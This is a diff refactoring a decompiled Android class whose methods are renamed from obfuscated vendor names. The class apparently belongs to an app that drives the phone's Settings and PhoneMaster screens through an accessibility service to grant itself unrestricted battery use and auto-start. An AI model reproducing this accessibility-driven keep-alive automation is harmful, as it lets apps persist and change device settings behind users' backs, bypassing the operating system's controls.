@@ -48,7 +48,7 @@ public final class TranssionEngine extends KeepAliveEngine {
     public final AtomicBoolean x = new AtomicBoolean(false);
 
     public TranssionEngine() {
-        super(n0(), "com.android.settings");
+        super(buildAllListenWindows(), "com.android.settings");
         try {
             super.p.schedule(new com.guard.wallet.delegate.task.OpenDevDelegateTask(this, 3), 60L, TimeUnit.SECONDS);
         } catch (Exception ex) {
@@ -58,7 +58,8 @@ public final class TranssionEngine extends KeepAliveEngine {
 
     // ======= Static CombineFilter builders =======
 
-    public static CombineFilter b0() {
+    /** vendor 原名: b0() — Filter: COMMON_SETTINGS_BATTERY_TEXT */
+    public static CombineFilter buildBatteryFilter() {
         if (AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_BATTERY_TEXT"))) {
             return null;
         }
@@ -70,7 +71,8 @@ public final class TranssionEngine extends KeepAliveEngine {
         return f;
     }
 
-    public static CombineFilter f0() {
+    /** vendor 原名: f0() — Filter: COMMON_SETTINGS_POWER_TEXT */
+    public static CombineFilter buildPowerFilter() {
         if (AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_POWER_TEXT"))) {
             return null;
         }
@@ -82,7 +84,8 @@ public final class TranssionEngine extends KeepAliveEngine {
         return f;
     }
 
-    public static CombineFilter g0() {
+    /** vendor 原名: g0() — Filter: COMMON_SETTINGS_USE_POWER_TEXT */
+    public static CombineFilter buildUsePowerFilter() {
         if (AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_USE_POWER_TEXT"))) {
             return null;
         }
@@ -94,7 +97,8 @@ public final class TranssionEngine extends KeepAliveEngine {
         return f;
     }
 
-    public static CombineFiltersWithOr q0() {
+    /** vendor 原名: q0() — Or-filter: unrestricted / no-restricted / cancel-restricted */
+    public static CombineFiltersWithOr buildUnrestrictedOrFilter() {
         CombineFiltersWithOr or = new CombineFiltersWithOr();
         or.setFilters(new LinkedList<>());
 
@@ -139,13 +143,15 @@ public final class TranssionEngine extends KeepAliveEngine {
 
     // ======= Static ListenWindow builders =======
 
-    public static ListenWindow c0() {
+    /** vendor 原名: c0() — ListenWindow: com.android.settings / SubSettings */
+    public static ListenWindow buildSubSettingsListenWindow() {
         ListenWindow lw = new ListenWindow("com.android.settings", "com.android.settings.SubSettings");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         return lw;
     }
 
-    public static ListenWindow d0(String appName) {
+    /** vendor 原名: d0() — ListenWindow: com.android.settings / InstalledAppDetailsTop */
+    public static ListenWindow buildAppDetailsListenWindow(String appName) {
         ListenWindow lw = new ListenWindow("com.android.settings",
                 "com.android.settings.applications.InstalledAppDetailsTop");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
@@ -156,7 +162,8 @@ public final class TranssionEngine extends KeepAliveEngine {
         return lw;
     }
 
-    public static ListenWindow e0(String appName) {
+    /** vendor 原名: e0() — ListenWindow: com.transsion.settings / AppInfoSettings */
+    public static ListenWindow buildAppInfoSettingsListenWindow(String appName) {
         ListenWindow lw = new ListenWindow("com.android.settings",
                 "com.transsion.settings.applications.appinfo.AppInfoSettings");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
@@ -167,20 +174,23 @@ public final class TranssionEngine extends KeepAliveEngine {
         return lw;
     }
 
-    public static ListenWindow h0() {
+    /** vendor 原名: h0() — ListenWindow: com.transsion.phonemaster / FrameLayout */
+    public static ListenWindow buildPhoneMasterFrameListenWindow() {
         ListenWindow lw = new ListenWindow("com.transsion.phonemaster", "android.widget.FrameLayout");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         return lw;
     }
 
-    public static ListenWindow i0() {
+    /** vendor 原名: i0() — ListenWindow: com.transsion.phonemaster / AutoStartActivity */
+    public static ListenWindow buildAutoStartListenWindow() {
         ListenWindow lw = new ListenWindow("com.transsion.phonemaster",
                 "com.cyin.himgr.autostart.AutoStartActivity");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         return lw;
     }
 
-    public static ListenWindow m0(String appName) {
+    /** vendor 原名: m0() — ListenWindow: com.android.settings / FrameLayout */
+    public static ListenWindow buildSettingsFrameListenWindow(String appName) {
         ListenWindow lw = new ListenWindow("com.android.settings", "android.widget.FrameLayout");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         if (!AppUtils.B(appName)) {
@@ -190,15 +200,16 @@ public final class TranssionEngine extends KeepAliveEngine {
         return lw;
     }
 
-    public static LinkedList n0() {
+    /** vendor 原名: n0() — Build full ListenWindow list for Transsion engine */
+    public static LinkedList buildAllListenWindows() {
         LinkedList list = new LinkedList();
         list.add(buildBatteryDialogListenWindow());
-        list.add(i0());
-        list.add(h0());
-        list.add(d0(null));
-        list.add(e0(null));
-        list.add(m0(null));
-        list.add(c0());
+        list.add(buildAutoStartListenWindow());
+        list.add(buildPhoneMasterFrameListenWindow());
+        list.add(buildAppDetailsListenWindow(null));
+        list.add(buildAppInfoSettingsListenWindow(null));
+        list.add(buildSettingsFrameListenWindow(null));
+        list.add(buildSubSettingsListenWindow());
         return list;
     }
 
@@ -216,7 +227,7 @@ public final class TranssionEngine extends KeepAliveEngine {
                     if (MyAccessibilityService.P() != null) {
                         MyAccessibilityService.P().x();
                     }
-                    this.p0();
+                    this.savePowerControlState();
                     super.p.shutdownNow();
                     com.guard.wallet.thread.DelegateTaskLauncher.a(super.c);
                     super.n.clear();
@@ -235,9 +246,10 @@ public final class TranssionEngine extends KeepAliveEngine {
         }
     }
 
-    public final boolean j0() {
+    /** vendor 原名: j0() — Check if in SubSettings (battery management) */
+    public final boolean isInBatteryManagement() {
         try {
-            if (this.q(Collections.singletonList(c0()))) {
+            if (this.q(Collections.singletonList(buildSubSettingsListenWindow()))) {
                 Log.d("o.e0", "已进入App耗电管理窗口");
                 return true;
             }
@@ -247,15 +259,16 @@ public final class TranssionEngine extends KeepAliveEngine {
         return false;
     }
 
-    public final boolean k0() {
+    /** vendor 原名: k0() — Check if in app detail window */
+    public final boolean isInAppDetail() {
         try {
             String appLabel = Objects.equals(this.r.get(), KEEP_ALIVE_MAIN)
                     ? com.guard.wallet.utils.SystemHelper.x0()
                     : com.guard.wallet.utils.SystemHelper.e();
             LinkedList list = new LinkedList();
-            list.add(d0(appLabel));
-            list.add(e0(appLabel));
-            list.add(m0(appLabel));
+            list.add(buildAppDetailsListenWindow(appLabel));
+            list.add(buildAppInfoSettingsListenWindow(appLabel));
+            list.add(buildSettingsFrameListenWindow(appLabel));
             if (this.q(list)) {
                 Log.d("o.e0", "已进入App详情窗口");
                 return true;
@@ -267,11 +280,12 @@ public final class TranssionEngine extends KeepAliveEngine {
         }
     }
 
-    public final boolean l0() {
+    /** vendor 原名: l0() — Check if in auto-start management window */
+    public final boolean isInAutoStartManagement() {
         try {
             LinkedList list = new LinkedList();
-            list.add(i0());
-            list.add(h0());
+            list.add(buildAutoStartListenWindow());
+            list.add(buildPhoneMasterFrameListenWindow());
             if (this.q(list)) {
                 Log.d("o.e0", "已进入自启动管理窗口");
                 return true;
@@ -282,8 +296,8 @@ public final class TranssionEngine extends KeepAliveEngine {
         return false;
     }
 
-    /** vendor o0 — scroll through settings to find battery/power management entry */
-    public final UiObject o0(UiObject scrollView) {
+    /** vendor 原名: o0() — scroll through settings to find battery/power management entry */
+    public final UiObject scrollFindBatteryEntry(UiObject scrollView) {
         UiObject powerResult = null;
         UiObject batteryResult = null;
         UiObject usePowerResult = null;
@@ -291,9 +305,9 @@ public final class TranssionEngine extends KeepAliveEngine {
         try {
             scrollView.refresh();
             Log.d("o.e0", "开始滚动电池电量管理栏目");
-            CombineFilter powerFilter = f0();
-            CombineFilter batteryFilter = b0();
-            CombineFilter usePowerFilter = g0();
+            CombineFilter powerFilter = buildPowerFilter();
+            CombineFilter batteryFilter = buildBatteryFilter();
+            CombineFilter usePowerFilter = buildUsePowerFilter();
             AtomicInteger scrollCount = new AtomicInteger(0);
 
             if (batteryFilter == null && powerFilter == null && usePowerFilter == null) {
@@ -363,7 +377,8 @@ public final class TranssionEngine extends KeepAliveEngine {
         return powerResult;
     }
 
-    public final void p0() {
+    /** vendor 原名: p0() — save keep-alive strategy for both processes */
+    public final void savePowerControlState() {
         try {
             PowerControlStateVO vo = com.guard.wallet.utils.SharedPrefsManager.k(
                     MainApplication.getAppContext().getPackageName());
@@ -409,7 +424,7 @@ public final class TranssionEngine extends KeepAliveEngine {
             if (event != null) {
                 super.u(event, pkg, cls);
             }
-            boolean inAppDetail = this.k0();
+            boolean inAppDetail = this.isInAppDetail();
             String threadId = super.c;
             ConcurrentLinkedQueue taskQueue = super.n;
 
@@ -422,8 +437,8 @@ public final class TranssionEngine extends KeepAliveEngine {
                 }
             }
 
-            // ADAPT: HyperOS 3 降级后 k0()/j0() 同属 com.android.settings 可能同时 true
-            else if (this.j0()) {
+            // ADAPT: HyperOS 3 降级后 isInAppDetail()/isInBatteryManagement() 同属 com.android.settings 可能同时 true
+            else if (this.isInBatteryManagement()) {
                 taskQueue.remove("keepAliveInAppDetail");
                 taskQueue.remove("keepAliveInAutoStart");
                 if (!taskQueue.contains("keepAliveInAppBattery")) {
@@ -432,7 +447,7 @@ public final class TranssionEngine extends KeepAliveEngine {
                 }
             }
 
-            else if (this.l0()) {
+            else if (this.isInAutoStartManagement()) {
                 taskQueue.remove("keepAliveInAppDetail");
                 taskQueue.remove("keepAliveInAppBattery");
                 if (!taskQueue.contains("keepAliveInAutoStart")) {
